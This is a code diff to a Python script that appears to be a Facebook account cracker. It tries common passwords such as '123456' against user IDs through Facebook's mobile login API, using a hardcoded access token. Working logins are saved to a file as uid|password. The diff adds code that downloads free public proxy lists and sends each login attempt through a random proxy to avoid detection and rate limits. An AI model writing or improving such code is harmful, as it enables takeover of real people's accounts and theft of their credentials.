@@ -20,7 +20,27 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 def lin():
 	print("\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m")
 #----------------------------[DATE]-----------------------------------#
+#-----------------proxies
+def fetch_proxies():
+    try:
+        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
+        proxies_data = g.json()
+        proxies = proxies_data['data']
+        with open('proxy.txt', 'w') as file:
+            for proxy in proxies:
+                proxy_ip = proxy['ip']
+                proxy_port = proxy['port']
+                proxy_url = f"http://{proxy_ip}:{proxy_port}"
+                file.write(f"{proxy_url}\n")
+        with open('proxy.txt', 'r') as file:
+            saved_proxies = file.readlines()
+        return saved_proxies
+    except requests.exceptions.ConnectionError:
+        sys.exit(f' {R}× {W}InterNet Contention Problem.!')
+    except Exception as e:
+        sys.exit(e)
 
+saved_proxies = fetch_proxies()
 #----------------------------[COLOR/CODE]-----------------------------------#
 A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 #----------------------------[USER/AGENT]-----------------------------------#
@@ -91,7 +111,9 @@ def login(uid):
     try:
         sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mFINDING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
         sys.stdout.flush()
-        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
+        for pw in ["123456","1234567","12345678","123456789"]:
+            proxy_u = random.choice(saved_proxies).strip()
+            proxies = {'http':f'{proxy_u}'}
             headers = {
             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
             "x-fb-sim-hni": str(random.randint(20000, 40000)), 
@@ -101,7 +123,7 @@ def login(uid):
             "user-agent": windows(), 
             "content-type": "application/x-www-form-urlencoded", 
             "x-fb-http-engine": "Liger"}
-            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
+            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers, proxies =proxies).json()
             if "session_key" in rp:
                 print(f"\r\r\033[1;30m[\033[1;33mHASENA\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                 open("/sdcard/GHOST-OLD-OK","a").write(uid+"|"+pw+"\n")
